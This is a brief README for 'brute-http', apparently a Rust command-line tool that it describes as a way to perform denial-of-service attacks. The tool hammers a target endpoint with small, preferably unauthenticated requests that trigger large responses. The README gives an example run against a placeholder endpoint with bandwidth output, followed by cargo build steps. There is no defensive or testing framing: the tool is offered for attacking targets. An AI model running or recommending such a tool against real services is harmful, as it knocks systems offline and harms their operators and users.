# brute-http

Use to perform DoS attack on target. The aim is to find a small request (unauthenticated is
prefered) generating a large response.

For instance:
```
./brute-http -r small-request-big-response http://vulnerable-endpoint.me/api/test
Up  153.125 Kbps | Down   10.105 Mbps |      NaN msec/response
Up  172.266 Kbps | Down  128.885 Mbps | 1731.178 msec/response
Up  199.062 Kbps | Down  123.160 Mbps | 1483.365 msec/response
Up  160.781 Kbps | Down  101.161 Mbps | 1704.667 msec/response
Up  237.344 Kbps | Down  122.795 Mbps | 1748.677 msec/response
Up  222.031 Kbps | Down  147.184 Mbps | 1295.207 msec/response
Up  245.000 Kbps | Down  134.359 Mbps | 1298.641 msec/response
Up  218.203 Kbps | Down  121.234 Mbps | 1422.404 msec/response
Up  195.234 Kbps | Down  119.027 Mbps | 1600.725 msec/response
Up  195.234 Kbps | Down  123.955 Mbps | 1430.294 msec/response
Up  195.234 Kbps | Down  130.125 Mbps | 1351.863 msec/response
^C
```

## Build

Just use cargo:

```bash
cargo build --release
ls -lh ${CARGO_TARGET_DIR:-target}/release/brute-http
```
